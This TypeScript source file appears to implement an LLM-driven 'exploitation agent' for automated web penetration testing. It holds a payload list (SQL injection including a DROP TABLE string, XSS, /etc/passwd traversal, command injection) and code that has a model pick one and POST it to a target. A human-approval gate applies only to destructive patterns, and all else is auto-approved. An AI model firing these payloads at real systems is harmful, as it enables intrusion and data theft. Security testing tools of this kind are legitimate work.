import type { MissionState, NodeFunction } from '../core/state-machine.js'
import type { ExploitResult, TaskAssignment } from '../agents/schemas.js'
import { toolRegistry } from '../tools/registry.js'
import { curlTool } from '../tools/curl.js'
import { MissionThrottle } from '../core/throttle.js'
import { getLLMClient } from '../core/llm-client.js'

const OWASP_ARSENAL = [
  { type: 'sqli', name: 'SQL Injection', payloads: ["' OR '1'='1", "'; DROP TABLE users--", "' UNION SELECT *--"] },
  { type: 'xss', name: 'Cross-Site Scripting', payloads: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"] },
  { type: 'idor', name: 'Insecure Direct Object Reference', payloads: ["../admin", "../../etc/passwd"] },
  { type: 'auth_bypass', name: 'Authentication Bypass', payloads: ["admin'--", "admin' #"] },
  { type: 'ssrf', name: 'Server-Side Request Forgery', payloads: ["http://localhost/", "http://127.0.0.1"] },
  { type: 'path_traversal', name: 'Path Traversal', payloads: ["../../../etc/passwd", "..\\..\\..\\windows\\system32"] },
  { type: 'cmdi', name: 'Command Injection', payloads: ["; ls -la", "| cat /etc/passwd"] },
]

const DESTRUCTIVE_PATTERNS = [
  /\bDROP\s+/i, /\bDELETE\s+FROM/i, /\bTRUNCATE\s+/i,
  /\bSHUTDOWN\b/i, /rm\s+-rf/i, /format\s+/i,
]

toolRegistry.register(curlTool)

const GAMMA_DECIDE_PROMPT = `You are Gamma, the exploitation agent. Decide on the best exploit strategy.

Target: {target}
Task: {task}
Available Tokens: {tokens}
OWASP Categories Tested: {coverage}

Respond with JSON:
{
  "exploit_type": "sqli|xss|idor|auth_bypass|ssrf|path_traversal|cmdi",
  "payload": "the payload to use",
  "target_endpoint": "endpoint to target",
  "reasoning": "why this approach"
}`

export const gammaExploit: NodeFunction = async (state: MissionState): Promise<Partial<MissionState>> => {
  const throttle = new MissionThrottle()
  const results: ExploitResult[] = []
  const llm = getLLMClient()

  for (const task of state.current_tasks) {
    const exploit = await executeExploitTask(task, throttle, llm, state)
    results.push(exploit)
  }

  return {
    exploit_results: results,
  }
}

async function executeExploitTask(
  task: TaskAssignment,
  throttle: MissionThrottle,
  llm: ReturnType<typeof getLLMClient>,
  state: MissionState
): Promise<ExploitResult> {
  const target = task.target || state.target
  
  try {
    const messages = [
      {
        role: 'user' as const,
        content: GAMMA_DECIDE_PROMPT
          .replace('{target}', target)
          .replace('{task}', task.description)
          .replace('{tokens}', JSON.stringify(state.discovered_credentials))
          .replace('{coverage}', String(state.coverage_score))
      }
    ]
    
    const response = await llm.chat('gamma', messages)
    const decision = JSON.parse(response)
    
    const exploitType = decision.exploit_type || 'sqli'
    const payload = decision.payload || generatePayload(exploitType)
    
    const ctx = await throttle.acquire()
    
    const tool = toolRegistry.get('curl')
    const result = await tool.execute({
      target: decision.target_endpoint || target,
      method: 'POST',
      payload: payload,
      headers: ctx.ua ? { 'User-Agent': ctx.ua } : {},
    })
    
    return {
      target: target,
      exploit_type: exploitType,
      success: result.success,
      payload: payload,
      http_status: result.metadata?.status as number,
      response_body: result.output,
      evidence: result.output?.slice(0, 500) ?? '',
      impact: determineImpact(exploitType, result),
      severity: determineSeverity(exploitType, result),
      execution_time: 0,
    }
  } catch (error) {
    return {
      target: target,
      exploit_type: 'error',
      success: false,
      error: String(error),
      evidence: '',
      impact: '',
      severity: 'INFO',
      execution_time: 0,
    }
  }
}

function generatePayload(exploitType: string): string {
  const exploit = OWASP_ARSENAL.find(e => e.type === exploitType)
  if (!exploit) return 'test'
  return exploit.payloads[Math.floor(Math.random() * exploit.payloads.length)]
}

function determineImpact(exploitType: string, result: { success: boolean; output?: string }): string {
  if (!result.success || !result.output) return 'No impact'
  
  const output = result.output.toLowerCase()
  if (output.includes('root:') || output.includes('admin')) {
    return 'Full system compromise'
  }
  if (output.includes('syntax error') || output.includes('mysql')) {
    return 'Database access'
  }
  return 'Potential vulnerability'
}

function determineSeverity(
  exploitType: string, 
  result: { success: boolean; output?: string }
): 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO' {
  if (!result.success) return 'INFO'
  
  const output = (result.output || '').toLowerCase()
  
  const criticalIndicators = ['root:', 'admin:', 'password', 'DROP TABLE', 'syntax error']
  const highIndicators = ['warning', 'notice', 'deprecated']
  
  for (const indicator of criticalIndicators) {
    if (output.includes(indicator)) return 'CRITICAL'
  }
  for (const indicator of highIndicators) {
    if (output.includes(indicator)) return 'HIGH'
  }
  return 'MEDIUM'
}

export const hitlApprovalGate: NodeFunction = async (state: MissionState): Promise<Partial<MissionState>> => {
  const hasDestructive = state.exploit_results.some(r => 
    r.payload && DESTRUCTIVE_PATTERNS.some(pattern => pattern.test(r.payload!))
  )

  if (hasDestructive) {
    return {
      needs_human_approval: true,
    }
  }

  return {
    needs_human_approval: false,
    human_response: 'auto_approved',
  }
}
